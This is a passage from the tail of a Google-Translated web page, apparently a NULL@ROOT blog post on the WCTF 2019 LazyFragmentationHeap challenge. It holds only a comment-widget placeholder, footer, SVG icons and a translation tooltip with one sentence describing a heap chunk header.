}&lt;/style&gt;&lt;/head&gt;&lt;body style=&quot;margin:0&quot;&gt;&lt;div style=&quot;display: flex !important; flex-direction: column !important; align-items: center !important; justify-content: center !important; width: 100% !important; height: 100% !important;&quot;&gt;&lt;div style=&quot;font-family: helvetica, arial, sans-serif !important; font-size: 16px !important; display: flex !important; flex-wrap: wrap !important; justify-content: center !important; text-align: center !important; margin: 10px !important;&quot;&gt;Privacy Badger has replaced this Disqus widget&lt;a id=&quot;ico-close-06429364775386825&quot; href=&quot;javascript:void(0)&quot;&gt;&lt;/a&gt;&lt;a id=&quot;ico-help-08688916912975184&quot; href=&quot;https://privacybadger.org/#How-does-Privacy-Badger-handle-social-media-widgets&quot; rel=&quot;noreferrer&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;font-family: helvetica, arial, sans-serif !important; font-size: 16px !important; display: flex !important; flex-wrap: wrap !important; justify-content: center !important; text-align: center !important; margin: 10px !important; width: 100% !important;&quot;&gt;&lt;button id=&quot;btn-once-08921831319626496&quot; style=&quot;transition: background-color 0.25s ease-out 0s, border-color 0.25s ease-out 0s, color 0.25s ease-out 0s !important; border-radius: 3px !important; cursor: pointer !important; font-family: -apple-system, BlinkMacSystemFont, avenir next, avenir, helvetica neue, helvetica, Ubuntu, roboto, noto, segoe ui, arial, sans-serif !important; font-size: 14px !important; font-weight: bold !important; line-height: 16px !important; padding: 10px !important; margin: 4px !important; width: 70% !important; max-width: 280px !important;&quot;&gt;Allow once&lt;/button&gt;&lt;button id=&quot;btn-site-0930795770095174&quot; style=&quot;transition: background-color 0.25s ease-out 0s, border-color 0.25s ease-out 0s, color 0.25s ease-out 0s !important; border-radius: 3px !important; cursor: pointer !important; font-family: -apple-system, BlinkMacSystemFont, avenir next, avenir, helvetica neue, helvetica, Ubuntu, roboto, noto, segoe ui, arial, sans-serif !important; font-size: 14px !important; font-weight: bold !important; line-height: 16px !important; padding: 10px !important; margin: 4px !important; width: 70% !important; max-width: 280px !important;&quot;&gt;Always allow on this site&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;" data-darkreader-inline-bgcolor="" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""></iframe>
     <script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html'; this.page.identifier = '/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup'; }; var disqus_shortname = 'mydisqus'; var disqus_developer = 0; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); </script>
     <noscript>
      Please enable JavaScript to view the <a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
     </noscript><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
    </section>
    <footer class="footer-main">
     NULL@ROOT © 2023 <a class="link" href="https://null2root-github-io.translate.goog/feed.xml?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp" target="_blank">
      <svg class="icon icon-rss">
       <use xlink:href="#icon-rss"></use>
      </svg></a>
     <p class="extra"><a class="link" href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://github.com/sergiokopplin/indigo">Indigo theme</a> by <a class="link" href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://github.com/sergiokopplin/indigo">Kopplin</a></p>
    </footer>
   </div>
  </div>
  <svg display="none" version="1.1" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink"><defs>
    <symbol id="icon-rss" viewBox="0 0 1024 1024">
     <title>rss</title>
     <path class="path1" d="M122.88 122.88v121.19c362.803 0 656.896 294.195 656.896 656.998h121.293c0-429.773-348.416-778.189-778.189-778.189zM122.88 365.414v121.293c228.813 0 414.362 185.498 414.362 414.413h121.242c0-295.834-239.821-535.706-535.603-535.706zM239.053 668.621c-64.205 0-116.224 52.122-116.224 116.275s52.019 116.224 116.224 116.224 116.173-52.019 116.173-116.224-51.968-116.275-116.173-116.275z"></path>
    </symbol>
    <symbol id="icon-facebook" viewBox="0 0 1024 1024">
     <title>facebook</title>
     <path class="path1" d="M870.4 51.2h-716.8c-56.32 0-102.4 46.080-102.4 102.4v716.8c0 56.371 46.080 102.4 102.4 102.4h358.4v-358.4h-102.4v-126.72h102.4v-104.96c0-110.797 62.054-188.621 192.819-188.621l92.314 0.102v133.376h-61.286c-50.893 0-70.246 38.195-70.246 73.626v86.528h131.482l-29.082 126.669h-102.4v358.4h204.8c56.32 0 102.4-46.029 102.4-102.4v-716.8c0-56.32-46.080-102.4-102.4-102.4z"></path>
    </symbol>
    <symbol id="icon-twitter" viewBox="0 0 1024 1024">
     <title>twitter</title>
     <path class="path1" d="M886.579 319.795c0.41 8.294 0.563 16.691 0.563 24.986 0 255.488-194.406 549.99-549.888 549.99-109.21 0-210.739-32-296.294-86.886 15.155 1.792 30.515 2.714 46.080 2.714 90.624 0 173.926-30.925 240.026-82.688-84.531-1.587-155.955-57.395-180.531-134.195 11.776 2.202 23.91 3.379 36.352 3.379 17.664 0 34.765-2.304 50.944-6.707-88.422-17.818-155.034-95.898-155.034-189.594 0-0.819 0-1.587 0-2.406 26.061 14.49 55.91 23.194 87.552 24.218-51.866-34.714-86.016-93.798-86.016-160.922 0-35.379 9.523-68.608 26.214-97.178 95.283 116.992 237.773 193.894 398.387 201.984-3.277-14.182-4.966-28.877-4.966-44.083 0-106.701 86.477-193.178 193.229-193.178 55.603 0 105.83 23.398 141.107 60.979 43.981-8.704 85.35-24.781 122.726-46.899-14.438 45.107-45.107 82.995-84.992 106.906 39.117-4.71 76.288-15.002 111.002-30.413-25.907 38.81-58.675 72.806-96.461 99.994z"></path>
    </symbol>
    <symbol id="icon-github" viewBox="0 0 1024 1024">
     <title>github</title>
     <path class="path1" d="M674.816 579.021c-36.762 0-66.56 41.318-66.56 92.109 0 50.893 29.798 92.211 66.56 92.211s66.56-41.318 66.56-92.211c-0.051-50.79-29.798-92.109-66.56-92.109zM906.547 339.251c7.629-18.688 7.936-124.877-32.512-226.611 0 0-92.723 10.189-233.011 106.496-29.44-8.192-79.258-12.186-128.973-12.186-49.818 0-99.584 3.994-129.024 12.186-140.339-96.307-233.062-106.496-233.062-106.496-40.397 101.734-39.987 207.923-32.461 226.611-47.514 51.61-76.544 113.613-76.544 198.195 0 367.923 305.306 373.811 382.31 373.811 17.51 0 52.122 0.102 88.781 0.102 36.608 0 71.27-0.102 88.678-0.102 77.107 0 382.31-5.888 382.31-373.811 0-84.582-28.979-146.586-76.493-198.195zM513.434 866.048h-2.867c-193.075 0-343.501-22.989-343.501-210.688 0-45.005 15.872-86.682 53.606-121.293 62.822-57.702 169.216-27.187 289.894-27.187 0.512 0 1.024 0 1.485 0 0.512 0 0.922 0 1.382 0 120.678 0 227.123-30.515 289.997 27.187 37.632 34.611 53.504 76.288 53.504 121.293 0 187.699-150.374 210.688-343.501 210.688zM349.235 579.021c-36.762 0-66.56 41.318-66.56 92.109 0 50.893 29.798 92.211 66.56 92.211 36.813 0 66.611-41.318 66.611-92.211 0-50.79-29.798-92.109-66.611-92.109z"></path>
    </symbol>
    <symbol id="icon-gitlab" viewBox="0 0 500 500">
     <title>gitlab</title>
     <path class="path1" d="M249.9,476.8L249.9,476.8l90.7-279.1H159.2L249.9,476.8L249.9,476.8zM32.1,197.7L32.1,197.7L4.5,282.5c-2.5,7.7,0.2,16.2,6.8,21l238.5,173.3L32.1,197.7L32.1,197.7zM32.1,197.7h127.1L104.6,29.6c-2.8-8.6-15-8.6-17.9,0L32.1,197.7L32.1,197.7zM467.6,197.7L467.6,197.7l27.6,84.8c2.5,7.7-0.2,16.2-6.8,21L249.9,476.8L467.6,197.7L467.6,197.7 zM467.6,197.7H340.5l54.6-168.1c2.8-8.6,15-8.6,17.9,0L467.6,197.7L467.6,197.7z"></path>
    </symbol>
    <symbol id="icon-youtube" viewBox="0 0 1024 1024">
     <title>youtube</title>
     <path class="path1" d="M512 117.76c-503.194 0-512 44.749-512 394.24s8.806 394.24 512 394.24 512-44.749 512-394.24-8.806-394.24-512-394.24zM676.096 529.101l-229.888 107.315c-20.122 9.318-36.608-1.126-36.608-23.347v-202.138c0-22.17 16.486-32.666 36.608-23.347l229.888 107.315c20.122 9.421 20.122 24.781 0 34.202z"></path>
    </symbol>
    <symbol id="icon-mail" viewBox="0 0 1024 1024">
     <title>mail</title>
     <path class="path1" d="M80.589 270.643c24.986 13.414 371.098 199.373 384 206.285s29.594 10.189 46.387 10.189c16.794 0 33.485-3.277 46.387-10.189s359.014-192.87 384-206.285c25.037-13.466 48.691-65.843 2.765-65.843h-866.253c-45.926 0-22.272 52.378 2.714 65.843zM952.986 383.437c-28.416 14.797-378.214 197.069-395.622 206.182s-29.594 10.189-46.387 10.189-28.979-1.075-46.387-10.189-365.21-191.437-393.626-206.234c-19.968-10.445-19.763 1.792-19.763 11.213s0 373.402 0 373.402c0 21.504 28.979 51.2 51.2 51.2h819.2c22.221 0 51.2-29.696 51.2-51.2 0 0 0-363.93 0-373.35s0.205-21.658-19.814-11.213z"></path>
    </symbol>
    <symbol id="icon-spotify" viewBox="0 0 1024 1024">
     <title>spotify</title>
     <path class="path1" d="M512 61.44c-248.883 0-450.56 201.626-450.56 450.56 0 248.781 201.677 450.56 450.56 450.56 248.934 0 450.509-201.728 450.509-450.56 0-248.883-201.523-450.56-450.509-450.56zM690.074 742.502c-8.858 0-15.053-3.379-21.555-7.322-60.877-36.915-136.294-56.269-218.010-56.269-41.677 0-86.682 4.966-133.632 14.592l-5.734 1.434c-5.939 1.434-12.032 3.021-16.691 3.021-18.995 0-33.843-14.746-33.843-33.587 0-19.098 10.752-32.614 28.774-35.994 56.115-12.8 108.954-19.046 161.382-19.046 94.976 0 179.866 22.016 252.467 65.485 12.442 7.27 20.275 15.667 20.275 34.202-0.051 18.483-15.002 33.485-33.434 33.485zM736.819 611.379c-10.598 0-17.562-4.045-23.706-7.629-109.722-65.075-273.050-86.682-407.603-50.842-2.253 0.666-4.301 1.28-6.144 1.894-5.069 1.587-9.779 3.174-16.435 3.174-22.118 0-40.090-18.074-40.090-40.346 0-21.453 11.213-36.454 31.437-42.189 51.866-14.234 100.557-23.654 170.65-23.654 113.254 0 223.078 28.416 309.146 79.923 15.667 8.96 22.784 21.197 22.784 39.475 0 22.221-17.971 40.192-40.038 40.192zM789.862 461.875c-9.984 0-16.128-2.406-25.344-7.373-74.394-44.646-190.464-71.219-310.733-71.219-62.669 0-119.603 6.912-169.267 20.326-1.69 0.41-3.277 0.87-5.018 1.382-5.274 1.587-11.878 3.482-18.688 3.482-26.419 0-47.053-20.89-47.053-47.565 0-23.194 13.005-40.909 34.816-47.36 59.955-17.715 128.973-26.675 205.107-26.675 137.114 0 267.571 30.464 357.939 83.507 16.998 9.677 25.344 24.32 25.344 44.646 0 26.266-20.685 46.848-47.104 46.848z"></path>
    </symbol>
    <symbol id="icon-lastfm" viewBox="0 0 315 315">
     <title>lastfm</title>
     <path class="path1" d="M264.467 135.355c-2.688-0.92-5.289-1.773-7.787-2.594C236.855 126.26 230 123.449 230 112.41 c0-9.572 6.799-16.26 16.533-16.26c7.986 0 13.502 3.307 19.039 11.41c2.156 3.158 6.348 4.188 9.721 2.389l19.148-10.205 c1.762-0.938 3.076-2.541 3.652-4.453c0.576-1.91 0.367-3.973-0.582-5.729c-11.123-20.596-27.912-31.037-49.9-31.037 c-16.592 0-30.648 5.227-40.654 15.117c-9.918 9.803-15.16 23.453-15.16 39.471c0 33.607 21.297 47.508 58.063 60.156 c21.045 7.311 25.965 10.137 25.965 21.121c0 13.578-11.727 23.434-27.885 23.434c-0.486 0-0.98-0.008-1.48-0.025 c-17.377-0.607-22.725-9.088-30.789-28.297c-12.947-30.814-28.082-67.734-29.205-70.543c-0.012-0.031-0.025-0.064-0.037-0.096 c-16.416-39.535-49.057-62.209-89.555-62.209C43.457 56.654 0 101.9 0 157.518c0 55.598 43.457 100.828 96.873 100.828 c29.217 0 56.559-13.49 75.016-37.014c1.674-2.133 2.064-5.004 1.025-7.508l-11.541-27.781c-1.125-2.711-3.729-4.514-6.66-4.619 c-2.945-0.105-5.654 1.512-6.971 4.135c-9.977 19.9-29.469 32.262-50.869 32.262c-31.658 0-57.414-27.053-57.414-60.303 c0-33.26 25.756-60.32 57.414-60.32c23.029 0 44.1 14.273 52.432 35.516c0.023 0.055 0.045 0.111 0.068 0.166l28.574 67.982 l3.293 7.617c13.811 33.602 34.273 48.652 66.359 48.797h0.133c38.348 0 67.268-26.699 67.268-62.103 C315 159.674 295.66 145.965 264.467 135.355z"></path>
    </symbol>
    <symbol id="icon-instagram" viewBox="0 0 1024 1024">
     <title>instagram</title>
     <path class="path1" d="M870.4 51.2h-716.8c-56.32 0-102.4 46.080-102.4 102.4v716.8c0 56.371 46.080 102.4 102.4 102.4h716.8c56.32 0 102.4-46.029 102.4-102.4v-716.8c0-56.32-46.080-102.4-102.4-102.4zM511.181 794.778c156.621 0 283.546-127.027 283.546-283.597 0-17.306-2.202-33.997-5.274-50.381h80.947v369.459c0 19.558-15.872 35.328-35.482 35.328h-645.837c-19.61 0-35.482-15.77-35.482-35.328v-369.459h79.309c-3.123 16.384-5.325 33.075-5.325 50.381 0 156.621 127.027 283.597 283.597 283.597zM333.978 511.181c0-97.894 79.36-177.203 177.254-177.203 97.843 0 177.254 79.309 177.254 177.203s-79.411 177.254-177.254 177.254c-97.946 0-177.254-79.36-177.254-177.254zM834.918 307.2h-82.688c-19.558 0-35.43-15.974-35.43-35.43v-82.79c0-19.558 15.872-35.379 35.379-35.379h82.688c19.661 0 35.533 15.821 35.533 35.379v82.739c0 19.507-15.872 35.482-35.482 35.482z"></path>
    </symbol>
    <symbol id="icon-linkedin" viewBox="0 0 1024 1024">
     <title>linkedin</title>
     <path class="path1" d="M256 153.6c0 54.374-36.352 101.171-102.451 101.171-62.208 0-102.349-44.134-102.349-98.509 0-55.808 38.912-105.062 102.4-105.062s101.171 46.592 102.4 102.4zM51.2 972.8v-665.6h204.8v665.6h-204.8z"></path>
     <path class="path2" d="M358.4 534.733c0-79.104-2.611-145.203-5.222-202.291h184.013l9.114 88.218h3.891c25.907-41.523 89.395-102.4 195.686-102.4 129.638 0 226.918 86.784 226.918 273.51v381.030h-204.8v-351.283c0-81.613-31.078-143.872-102.4-143.872-54.374 0-81.613 44.032-95.898 80.333-5.222 13.005-6.502 31.13-6.502 49.306v365.517h-204.8v-438.067z"></path>
    </symbol>
    <symbol id="icon-google" viewBox="0 0 1024 1024">
     <title>google</title>
     <path class="path1" d="M522.2 438.8v175.6h290.4c-11.8 75.4-87.8 220.8-290.4 220.8-174.8 0-317.4-144.8-317.4-323.2s142.6-323.2 317.4-323.2c99.4 0 166 42.4 204 79l139-133.8c-89.2-83.6-204.8-134-343-134-283 0-512 229-512 512s229 512 512 512c295.4 0 491.6-207.8 491.6-500.2 0-33.6-3.6-59.2-8-84.8l-483.6-0.2z"></path>
    </symbol>
    <symbol id="icon-google-plus" viewBox="0 0 1317 1024">
     <title>google-plus</title>
     <path class="path1" d="M821.143 521.714q0 118.857-49.714 211.714t-141.714 145.143-210.857 52.286q-85.143 0-162.857-33.143t-133.714-89.143-89.143-133.714-33.143-162.857 33.143-162.857 89.143-133.714 133.714-89.143 162.857-33.143q163.429 0 280.571 109.714l-113.714 109.143q-66.857-64.571-166.857-64.571-70.286 0-130 35.429t-94.571 96.286-34.857 132.857 34.857 132.857 94.571 96.286 130 35.429q47.429 0 87.143-13.143t65.429-32.857 44.857-44.857 28-47.429 12.286-42.286h-237.714v-144h395.429q6.857 36 6.857 69.714zM1316.571 452v120h-119.429v119.429h-120v-119.429h-119.429v-120h119.429v-119.429h120v119.429h119.429z"></path>
    </symbol>
    <symbol id="icon-pinterest" viewBox="0 0 1024 1024">
     <title>pinterest</title>
     <path class="path1" d="M512 68.4c-245 0-443.6 198.6-443.6 443.6 0 188 117 348.4 282 413-3.8-35-7.4-89 1.6-127.2 8-34.6 52-220.4 52-220.4s-13.2-26.6-13.2-65.8c0-61.6 35.8-107.8 80.2-107.8 37.8 0 56.2 28.4 56.2 62.4 0 38-24.2 95-36.8 147.6-10.6 44.2 22 80.2 65.6 80.2 78.8 0 139.4-83.2 139.4-203.2 0-106.2-76.4-180.4-185.2-180.4-126.2 0-200.2 94.6-200.2 192.6 0 38.2 14.6 79 33 101.2 3.6 4.4 4.2 8.2 3 12.8-3.4 14-10.8 44.2-12.4 50.4-2 8.2-6.4 9.8-14.8 6-55.4-25.8-90-106.8-90-171.8 0-140 101.6-268.4 293-268.4 153.8 0 273.4 109.6 273.4 256.2 0 152.8-96.4 276-230.2 276-45 0-87.2-23.4-101.6-51 0 0-22.2 84.6-27.6 105.4-10 38.6-37 86.8-55.2 116.2 41.6 12.8 85.6 19.8 131.4 19.8 245 0 443.6-198.6 443.6-443.6 0-245.2-198.6-443.8-443.6-443.8z"></path>
    </symbol>
    <symbol id="icon-medium" viewBox="0 0 179.2 179.2">
     <title>medium</title>
     <path transform="scale(0.1,-0.1) translate(0,-1536)" d="M597 1115v-1173q0 -25 -12.5 -42.5t-36.5 -17.5q-17 0 -33 8l-465 233q-21 10 -35.5 33.5t-14.5 46.5v1140q0 20 10 34t29 14q14 0 44 -15l511 -256q3 -3 3 -5zM661 1014l534 -866l-534 266v600zM1792 996v-1054q0 -25 -14 -40.5t-38 -15.5t-47 13l-441 220zM1789 1116 q0 -3 -256.5 -419.5t-300.5 -487.5l-390 634l324 527q17 28 52 28q14 0 26 -6l541 -270q4 -2 4 -6z"></path>
    </symbol>
    <symbol id="icon-vimeo" viewBox="0 0 21 21">
     <title>vimeo</title>
     <path d="M17.811,2.018c2.017,0.053,3.026,1.198,3.036,3.438c0,0.147-0.005,0.3-0.013,0.457c-0.089,1.899-1.502,4.486-4.245,7.76 c-2.829,3.43-5.229,5.147-7.2,5.156c-1.226,0-2.244-1.05-3.061-3.151l-0.858-2.88L4.622,9.922C3.997,7.838,3.329,6.798,2.616,6.798 c-0.156,0-0.697,0.304-1.626,0.91L0,6.537l1.536-1.276l1.511-1.263C4.4,2.914,5.429,2.328,6.135,2.241 c0.094-0.01,0.188-0.013,0.284-0.013c1.449,0,2.354,1.041,2.709,3.124C9.326,6.54,9.49,7.506,9.623,8.248 C9.752,8.992,9.86,9.51,9.946,9.805c0.479,1.97,0.995,2.96,1.55,2.968c0.426,0,1.082-0.642,1.968-1.926 c0.866-1.319,1.332-2.296,1.392-2.932c0.019-0.129,0.026-0.25,0.026-0.362c0-0.861-0.474-1.29-1.418-1.29 c-0.479,0-0.99,0.102-1.537,0.299c0.98-3.021,2.864-4.534,5.65-4.544C17.655,2.018,17.732,2.018,17.811,2.018z"></path>
    </symbol>
    <symbol id="icon-stackoverflow" viewBox="0 0 878 1024">
     <title>stackoverflow</title>
     <path class="path1" d="M736.571 932.571h-638.857v-274.286h-91.429v365.714h821.714v-365.714h-91.429v274.286zM198.286 633.143l18.857-89.714 447.429 94.286-18.857 89.143zM257.143 419.429l38.286-83.429 414.286 193.714-38.286 82.857zM372 216l58.286-70.286 350.857 293.143-58.286 70.286zM598.857 0l272.571 366.286-73.143 54.857-272.571-366.286zM188.571 840.571v-90.857h457.143v90.857h-457.143z"></path>
    </symbol>
    <symbol id="icon-reddit" viewBox="0 0 1024 1024">
     <title>reddit</title>
     <path class="path1" d="M1024 483.429q0 33.143-16.857 60.286t-45.429 41.429q6.857 26.286 6.857 54.857 0 88.571-60.857 164t-166 119.143-228.571 43.714-228.286-43.714-165.714-119.143-60.857-164q0-26.857 6.286-53.714-29.143-14.286-46.857-42t-17.714-60.857q0-46.857 33.143-80.286t80.571-33.429q48.571 0 82.857 36 124.571-86.857 294.286-92.571l66.286-297.714q1.714-7.429 8.571-12t14.857-2.857l210.857 46.286q10.286-21.143 30.857-34t45.143-12.857q35.429 0 60.571 24.857t25.143 60.286-25.143 60.571-60.571 25.143-60.286-24.857-24.857-60.286l-190.857-42.286-59.429 269.714q171.429 5.143 296.571 91.429 33.143-34.857 81.714-34.857 47.429 0 80.571 33.429t33.143 80.286zM238.857 597.143q0 35.429 24.857 60.571t60.286 25.143 60.571-25.143 25.143-60.571-25.143-60.286-60.571-24.857q-34.857 0-60 25.143t-25.143 60zM701.714 800q6.286-6.286 6.286-14.857t-6.286-14.857q-5.714-5.714-14.286-5.714t-14.857 5.714q-23.429 24-69.143 35.429t-91.429 11.429-91.429-11.429-69.143-35.429q-6.286-5.714-14.857-5.714t-14.286 5.714q-6.286 5.714-6.286 14.571t6.286 15.143q24.571 24.571 67.714 38.857t70 16.857 52 2.571 52-2.571 70-16.857 67.714-38.857zM700 682.857q35.429 0 60.286-25.143t24.857-60.571q0-34.857-25.143-60t-60-25.143q-35.429 0-60.571 24.857t-25.143 60.286 25.143 60.571 60.571 25.143z"></path>
    </symbol>
    <symbol id="icon-quora" viewBox="0 0 76 76">
     <title>quora</title>
     <path class="path1" d="M67.9,59.1c0,0-0.4,5.3-5.2,5.3c-3.7,0-6.3-2.8-8.7-6.5c6.8-5.9,11.1-14.7,11.1-24.6C65.1,15.4,51.1,1,33.8,1 S2.6,15.4,2.6,33.2s14,32.2,31.3,32.2c3.1,0,6.2-0.5,9-1.4C46.5,69.8,51,75,58.2,75c14.6,0,15.2-15.9,15.2-15.9L67.9,59.1 L67.9,59.1z M33.8,60.2c-10.1,0-18.2-12.1-18.2-26.9S23.8,6.3,33.8,6.3s18.2,12.1,18.2,26.9c0,5.9-1.3,11.4-3.5,15.8 c-2.5-3.5-5.4-6.5-9.7-7.5c-7.5-1.7-14,1.7-16.1,3.4l1.9,4c0,0,2-1.1,6.8,0c3.1,0.7,5.4,4.9,8.1,9.8C37.9,59.7,35.9,60.2,33.8,60.2 z"></path>
    </symbol>
    <symbol id="icon-microphone" viewBox="-8 -4 34 37">
     <title>quora</title>
     <path clip-rule="evenodd" d="M10.8,22.8V26h5v2h-5h-3h-5v-2h5v-3.2C3.4,22.2,0,18.7,0,14.4v-3 c0-0.1,0-0.3,0-0.4h2.8c0,0.3-0.1,0.6-0.1,0.9V14c0,3.3,2.9,6,6.5,6c3.6,0,6.5-2.7,6.5-6v-2.1c0-0.3,0-0.6-0.1-0.9h2.8 c0,0.1,0,0.3,0,0.4v3C18.6,18.7,15.2,22.2,10.8,22.8z M9.3,18c-2.5,0-4.5-2-4.5-4.5v-9C4.8,2,6.8,0,9.3,0s4.5,2,4.5,4.5v9 C13.8,16,11.8,18,9.3,18z" fill="#0D0D0D" fill-rule="evenodd" style="--darkreader-inline-fill: #e0ddd9;" data-darkreader-inline-fill=""></path>
    </symbol>
   </defs>
  </svg>
  <script>function gtElInit() {var lib = new google.translate.TranslateService();lib.translatePage('hr', 'en', function () {});}</script>
  <script src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/element.js" type="text/javascript"></script><div id="goog-gt-tt" class="VIpgJd-suEOdc VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0px 0px 0px -23px; padding: 0px; font-family: &quot;Google Sans&quot;, Arial, sans-serif; visibility: hidden; left: 697px; top: 5632px; width: 536px; display: none;" data-id="114" lang="en-US"><div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd"><div class=" VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c"><img src="[Writeup]%20LazyFragmentationHeap%20-%20WCTF%202019%20NULL@ROOT_files/24px.svg" width="24" height="24" alt=""></div><div class=" VIpgJd-yAWNEb-hvhgNd-k77Iif-i3jM8c"><div class="VIpgJd-yAWNEb-hvhgNd-IuizWc" dir="ltr">Original text</div><div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1" lang="auto">: glibc에서 쓰이는 malloc_chunk 구조체의 header 부분 처럼 할당된 Heap chunk의 header 역할을 하는 구조체.</div></div><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr"><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr"><div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">Rate this translation</div><div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">Your feedback will be used to help improve Google Translate</div></div><div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr"><button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Good translation" aria-label="Good translation" aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"></path></svg></span><span id="goog-gt-thumbUpIconFilled" style="display: none;"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"></path></svg></span></button><button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Poor translation" aria-label="Poor translation" aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"></path></svg></span><span id="goog-gt-thumbDownIconFilled" style="display: none;"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"></path></svg></span></button></div></div><div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><form id="goog-gt-votingForm" action="//translate.googleapis.com/translate_voting?client=wt_lib" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl" id="goog-gt-votingInputSrcLang" value="auto"><input type="text" name="tl" id="goog-gt-votingInputTrgLang" value="en"><input type="text" name="query" id="goog-gt-votingInputSrcText" value=": glibc에서 쓰이는 malloc_chunk 구조체의 header 부분 처럼 할당된 Heap chunk의 header 역할을 하는 구조체."><input type="text" name="gtrans" id="goog-gt-votingInputTrgText" value=": A structure that serves as the header of the allocated Heap chunk, like the header part of the malloc_chunk structure used in glibc."><input type="text" name="vote" id="goog-gt-votingInputVote" value="0"></form><iframe name="votingFrame" frameborder="0"></iframe></div></div></div>
 
</body></html>